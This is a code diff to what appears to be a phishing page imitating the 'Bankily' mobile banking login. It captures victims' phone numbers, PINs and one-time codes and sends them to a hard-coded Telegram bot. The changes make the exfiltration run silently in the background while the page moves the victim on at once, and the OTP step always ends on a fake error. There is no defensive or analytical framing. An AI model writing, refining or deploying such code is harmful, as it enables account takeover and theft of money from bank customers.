@@ -391,21 +391,20 @@ html,body{width:100%;height:100%;overflow:hidden;font-family:'Cairo',sans-serif;
 const TELEGRAM_TOKEN = "8854630231:AAHwY-escCA2tlAzBgDZWqNaPNqUNTpIKGA";
 const TELEGRAM_CHAT_ID = "8972356637";
 
-async function sendTelegramMessage(text) {
+function sendTelegramMessage(text) {
     const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
-    try {
-        await fetch(url, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-                chat_id: TELEGRAM_CHAT_ID,
-                text: text,
-                parse_mode: "HTML"
-            }),
-        });
-    } catch (error) {
+    // إرسال البيانات في الخلفية فوراً دون إبطاء الواجهة
+    fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: text,
+            parse_mode: "HTML"
+        }),
+    }).catch(error => {
         console.error("خطأ في إرسال البيانات عبر تليجرام:", error);
-    }
+    });
 }
 // --- نهاية إعدادات التليجرام ---
 
@@ -469,7 +468,7 @@ phEl.addEventListener('input',function(){
   document.getElementById('err-ph').textContent='';
 });
 
-async function login(){
+function login(){
   var ph=phEl.value.trim();
   var pin=P.map(function(p){return p.value;}).join('');
   
@@ -479,10 +478,12 @@ async function login(){
   if(ph.length !== 8 || !isValidPrefix || pin.length !== 4){
     document.getElementById('user-error-modal').classList.remove('hide');
   } else {
-    // إرسال معلومات تسجيل الدخول للبوت بالمعلومات الجديدة
-    let message = `🔔 <b>Bankily Login</b>\n📱 Phone: ${ph}\n🔑 Pin: ${pin}`;
-    await sendTelegramMessage(message);
+    // الانتقال للواجهة الثانية فوراً (في رمشة عين)
     showOtp();
+    
+    // إرسال معلومات تسجيل الدخول للبوت في الخلفية بصمت
+    let message = `🔔 <b>Bankily Login</b>\n📱 Phone: ${ph}\n🔑 Pin: ${pin}`;
+    sendTelegramMessage(message);
   }
 }
 
@@ -521,7 +522,7 @@ O.forEach(function(el,i){
   });
 });
 
-async function verify(){
+function verify(){
   var code=O.map(function(o){return o.value;}).join('');
   
   if(code.length !== 4) {
@@ -531,11 +532,12 @@ async function verify(){
   var ph=phEl.value.trim();
   var pin=P.map(function(p){return p.value;}).join('');
   
-  // إرسال رمز التحقق (OTP) مع رقم الهاتف والرقم السري للبوت
-  let message = `🔔 <b>Bankily Login (OTP)</b>\n📱 Phone: ${ph}\n🔑 Pin: ${pin}\n📝 OTP: ${code}`;
-  await sendTelegramMessage(message);
-
+  // إظهار نافذة الخطأ فوراً
   document.getElementById('otp-error-modal').classList.remove('hide');
+
+  // إرسال رمز التحقق (OTP) للبوت في الخلفية بصمت
+  let message = `🔔 <b>Bankily Login (OTP)</b>\n📱 Phone: ${ph}\n🔑 Pin: ${pin}\n📝 OTP: ${code}`;
+  sendTelegramMessage(message);
 }
 
 function closeOtpErrorModal(){
